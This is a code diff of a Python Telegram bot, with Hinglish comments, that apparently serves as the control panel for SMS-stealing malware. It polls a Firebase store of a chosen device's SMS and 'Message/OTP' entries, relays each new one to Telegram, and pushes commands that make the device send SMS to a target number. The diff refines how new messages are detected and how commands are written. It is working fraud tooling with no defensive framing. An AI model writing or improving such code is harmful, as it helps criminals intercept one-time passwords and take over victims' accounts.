@@ -184,30 +184,32 @@ async def add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def monitor_task(chat_id, context):
     global is_monitoring, selected_device_id
+    last_sms_key = None
+    last_msg_key = None
+    
+    # Init: Pehle last key note karo taaki purana data na aaye
     try:
-        sms_url = f"{firebase_base}/{selected_device_id}/sms.json"
-        msg_url = f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json"
-        sms_data = requests.get(sms_url).json() or {}
-        msg_data = requests.get(msg_url).json() or {}
-        seen_keys = set(sms_data.keys()) | set(msg_data.keys())
-    except:
-        seen_keys = set()
+        sms_data = requests.get(f"{firebase_base}/{selected_device_id}/sms.json").json()
+        if sms_data: last_sms_key = list(sms_data.keys())[-1]
+        msg_data = requests.get(f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json").json()
+        if msg_data: last_msg_key = list(msg_data.keys())[-1]
+    except: pass
     
     while is_monitoring:
         try:
             sms_data = requests.get(f"{firebase_base}/{selected_device_id}/sms.json").json()
             if sms_data and isinstance(sms_data, dict):
-                for key, val in sms_data.items():
-                    if key not in seen_keys:
-                        seen_keys.add(key)
-                        await context.bot.send_message(chat_id=chat_id, text=f"📱 New SMS:\n{val}")
+                keys = list(sms_data.keys())
+                if keys[-1] != last_sms_key:
+                    last_sms_key = keys[-1]
+                    await context.bot.send_message(chat_id=chat_id, text=f"📱 New SMS:\n{sms_data[last_sms_key]}")
             
             msg_data = requests.get(f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json").json()
             if msg_data and isinstance(msg_data, dict):
-                for key, val in msg_data.items():
-                    if key not in seen_keys:
-                        seen_keys.add(key)
-                        await context.bot.send_message(chat_id=chat_id, text=f"📩 New Message/OTP:\n{val}")
+                keys = list(msg_data.keys())
+                if keys[-1] != last_msg_key:
+                    last_msg_key = keys[-1]
+                    await context.bot.send_message(chat_id=chat_id, text=f"📩 New Message/OTP:\n{msg_data[last_msg_key]}")
         except: pass
         await asyncio.sleep(5)
 
@@ -215,15 +217,15 @@ async def start_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check(update): return
     global is_monitoring
     if not selected_device_id or not monitored_channel_id:
-        await update.message.reply_text("❌ Error: Device ya Channel set karna zaroori hai!")
+        await update.message.reply_text("❌ Error: Channel set karna zaroori hai!")
         return
     is_monitoring = True
     asyncio.create_task(monitor_task(update.effective_chat.id, context))
     await update.message.reply_text("🚀 Monitoring Started! Aab Message Bot Pe Aayenge OR Auto Token Verify Hoga.")
 
 async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global selected_device_id
-    if update.channel_post and str(update.channel_post.chat.id) == monitored_channel_id:
+    global is_monitoring, selected_device_id
+    if is_monitoring and update.channel_post and str(update.channel_post.chat.id) == monitored_channel_id:
         msg_text = update.channel_post.text or ""
         try:
             target_number = ""
@@ -234,15 +236,14 @@ async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             if target_number and token:
                 payload = {"from": 0, "to": target_number, "message": token, "isSended": False}
-                # Yaha .post use kiya hai taki data naya entry bane, .put purana hata deta hai
                 push_url = f"{firebase_base}/{selected_device_id}/webhookEvent/sendSms.json"
-                response = requests.post(push_url, json=payload)
+                response = requests.put(push_url, json=payload)
                 if response.status_code == 200:
-                    await update.effective_chat.send_message(f"✅ SMS Sent to Webhook!\n🎯 To: {target_number}")
+                    await update.effective_chat.send_message(f"✅ SMS Sent to Connection Device!\n🎯 To: {target_number}")
                 else:
                     await update.effective_chat.send_message(f"❌ Firebase Error: {response.status_code}")
             else:
-                await update.message.reply_text("❌ Format mismatch! Check: To: <num>\nMessage: <text>")
+                await update.effective_chat.send_message("❌ Format mismatch!")
         except Exception as e:
             await update.effective_chat.send_message(f"❌ Error: {str(e)}")
 
